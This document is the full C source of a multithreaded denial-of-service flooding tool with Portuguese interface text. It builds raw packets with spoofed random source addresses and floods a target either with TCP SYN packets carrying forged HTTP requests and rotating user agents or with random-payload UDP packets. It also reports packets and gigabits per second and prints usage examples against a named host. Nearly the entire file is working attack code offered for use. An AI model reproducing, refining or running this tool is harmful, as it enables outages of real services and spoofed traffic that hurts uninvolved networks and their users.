#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>

#define MAX_PACKET 65535
#define DEFAULT_THREADS 10
#define DEFAULT_SIZE 1400
#define MAX_THREADS 100

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    char host[128];
    char path[256];
} attack_args_t;

volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;

const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://twitter.com/help/crawling)",
    "Mozilla/5.0 (compatible; Applebot/1.0; +http://www.apple.com/go/applebot)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; SemrushBot/1.0; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
};

#define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    uint32_t ip;
    do {
        ip = (rand() & 0xFF) << 24 |
             (rand() & 0xFF) << 16 |
             (rand() & 0xFF) << 8 |
             (rand() & 0xFF);
    } while (ip == 0x0100007F || ip == 0x0A000000 || ip == 0xAC100000 || ip == 0xC0A80000);
    return ip;
}

void build_http_request(char *buffer, char *host, char *path, int size, int ua_index) {
    int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
    int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
    int r9 = rand() % 255, r10 = rand() % 255, r11 = rand() % 255, r12 = rand() % 255;
    
    snprintf(buffer, size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Cache-Control: no-cache, no-store, must-revalidate\r\n"
        "Pragma: no-cache\r\n"
        "X-Forwarded-For: %d.%d.%d.%d\r\n"
        "X-Real-IP: %d.%d.%d.%d\r\n"
        "X-Client-IP: %d.%d.%d.%d\r\n"
        "Referer: http://%s/\r\n"
        "\r\n",
        path, host, user_agents[ua_index % NUM_USER_AGENTS],
        r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12,
        host
    );
}

void *http_flood_thread(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    char *payload;
    int packet_size;
    time_t end_time;
    char http_request[4096];
    int ua_counter = rand() % NUM_USER_AGENTS;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 16;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
        int http_len = strlen(http_request);
        
        packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
        
        if (packet_size > MAX_PACKET) {
            packet_size = MAX_PACKET;
            http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
        }
        
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
        payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        memcpy(payload, http_request, http_len);

        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        }

        if (sent_count % 10 == 0) {
            usleep(1);
        }
    }

    close(sockfd);
    return NULL;
}

void *udp_raw_flood_thread(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 16;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        }
    }

    close(sockfd);
    return NULL;
}

void print_stats() {
    static time_t last_print = 0;
    static unsigned long long last_packets = 0;
    static unsigned long long last_bytes = 0;
    time_t now = time(NULL);
    
    if (now - last_print >= 1) {
        unsigned long long pps = packets_sent - last_packets;
        unsigned long long bps = bytes_sent - last_bytes;
        double mbps = (bps * 8) / 1000000.0;
        double gbps = mbps / 1000.0;
        
        printf("\r[+] Pacotes: %llu | PPS: %llu | %.2f Mbps | %.3f Gbps     ",
               packets_sent, pps, mbps, gbps);
        fflush(stdout);
        last_print = now;
        last_packets = packets_sent;
        last_bytes = bytes_sent;
    }
}

void *stats_thread(void *arg) {
    while (attack_running) {
        print_stats();
        usleep(100000);
    }
    return NULL;
}

void print_usage(char *program_name) {
    printf("\n=== HTTP FLOOD DOS TOOL ===\n\n");
    printf("Uso: %s <URL> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
    printf("Argumentos:\n");
    printf("  URL      - URL do alvo (ex: exemplo.com ou /caminho)\n");
    printf("  PORTA    - Porta de destino\n");
    printf("  TEMPO    - Duracao em segundos\n\n");
    printf("Opcoes:\n");
    printf("  -t       - Numero de threads (padrao: %d)\n", DEFAULT_THREADS);
    printf("  -s       - Tamanho do pacote (padrao: %d)\n", DEFAULT_SIZE);
    printf("  -r       - Modo UDP raw com spoofing\n");
    printf("  -h       - Ajuda\n\n");
    printf("Exemplos:\n");
    printf("  sudo %s exemplo.com 80 30\n", program_name);
    printf("  sudo %s exemplo.com 443 60 -t 20\n", program_name);
    printf("  sudo %s exemplo.com 80 30 -r\n", program_name);
    printf("\n");
}

void parse_url(char *url, char *host, char *path) {
    char *slash = strchr(url, '/');
    if (slash == NULL) {
        strcpy(host, url);
        strcpy(path, "/");
    } else {
        int host_len = slash - url;
        strncpy(host, url, host_len);
        host[host_len] = '\0';
        strcpy(path, slash);
        if (strlen(path) == 0) {
            strcpy(path, "/");
        }
    }
}

int main(int argc, char *argv[]) {
    char target[256];
    char host[128];
    char path[256];
    int port, duration;
    int num_threads = DEFAULT_THREADS;
    int packet_size = DEFAULT_SIZE;
    int use_raw = 0;
    int opt;

    if (argc < 4) {
        print_usage(argv[0]);
        return 1;
    }

    strcpy(target, argv[1]);
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    parse_url(target, host, path);

    if (strlen(host) == 0) {
        printf("Erro: Host invalido\n");
        return 1;
    }

    struct hostent *he = gethostbyname(host);
    if (he == NULL) {
        printf("Erro: Nao foi possivel resolver o host: %s\n", host);
        return 1;
    }
    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
    char ip[INET_ADDRSTRLEN];
    strcpy(ip, inet_ntoa(*addr_list[0]));

    printf("Host: %s -> IP: %s\n", host, ip);

    optind = 4;
    while ((opt = getopt(argc, argv, "t:s:r h")) != -1) {
        switch (opt) {
            case 't':
                num_threads = atoi(optarg);
                if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
                if (num_threads < 1) num_threads = 1;
                break;
            case 's':
                packet_size = atoi(optarg);
                if (packet_size > 1472) packet_size = 1472;
                if (packet_size < 64) packet_size = 64;
                break;
            case 'r':
                use_raw = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    if (geteuid() != 0) {
        printf("\n[!] REQUER PERMISSAO DE ROOT!\n");
        printf("[!] Execute: sudo %s ...\n\n", argv[0]);
        return 1;
    }

    printf("\n=== INICIANDO ATAQUE HTTP ===\n");
    printf("Alvo: %s (%s:%d)\n", host, ip, port);
    printf("Path: %s\n", path);
    printf("Duracao: %d segundos\n", duration);
    printf("Threads: %d\n", num_threads);
    printf("Tamanho do pacote: %d bytes\n", packet_size);
    printf("Modo: %s\n", use_raw ? "UDP Raw (spoofing)" : "HTTP TCP com spoofing");
    printf("User Agents: %d diferentes\n", NUM_USER_AGENTS);
    printf("==========================\n\n");

    srand(time(NULL) ^ getpid());
    signal(SIGPIPE, SIG_IGN);

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    attack_args_t *args = malloc(num_threads * sizeof(attack_args_t));

    if (threads == NULL || args == NULL) {
        printf("Erro ao alocar memoria\n");
        return 1;
    }

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].target, ip, sizeof(args[i].target) - 1);
        args[i].target[sizeof(args[i].target) - 1] = '\0';
        args[i].port = port;
        args[i].duration = duration;
        args[i].packet_size = packet_size;
        args[i].thread_id = i;
        strncpy(args[i].host, host, sizeof(args[i].host) - 1);
        args[i].host[sizeof(args[i].host) - 1] = '\0';
        strncpy(args[i].path, path, sizeof(args[i].path) - 1);
        args[i].path[sizeof(args[i].path) - 1] = '\0';

        if (use_raw) {
            pthread_create(&threads[i], NULL, udp_raw_flood_thread, &args[i]);
        } else {
            pthread_create(&threads[i], NULL, http_flood_thread, &args[i]);
        }
    }

    pthread_t stats_thread_id;
    pthread_create(&stats_thread_id, NULL, stats_thread, NULL);

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_cancel(stats_thread_id);
    pthread_join(stats_thread_id, NULL);

    double total_gb = (bytes_sent * 8) / 1000000000.0;

    printf("\n\n[+] Ataque finalizado!\n");
    printf("[+] Total de pacotes enviados: %llu\n", packets_sent);
    printf("[+] Total de dados enviados: %.2f GB\n", total_gb);
    if (duration > 0) {
        printf("[+] Media de PPS: %llu\n", packets_sent / duration);
        printf("[+] Media de Gbps: %.3f\n", total_gb / duration);
    }

    free(threads);
    free(args);

    return 0;
}
